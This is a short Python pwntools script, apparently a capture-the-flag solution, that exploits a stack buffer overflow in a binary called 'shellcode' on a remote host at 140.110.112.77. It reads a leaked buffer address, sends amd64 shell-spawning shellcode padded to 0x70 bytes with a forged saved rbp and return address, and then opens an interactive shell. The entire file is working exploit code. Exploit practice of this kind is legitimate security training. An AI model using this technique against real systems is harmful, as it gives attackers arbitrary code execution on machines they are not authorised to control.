#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./shellcode"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2119)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    b *0x0400664
    c
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'


c.recvuntil(' is ')
buf_addr = int(c.recvline()[:-1], 16)

rbp = p64(0x123)
ret = p64(buf_addr)

c.send(flat(asm(pwnlib.shellcraft.amd64.linux.sh()), length=0x70) + rbp + ret)


c.interactive()
c.close()
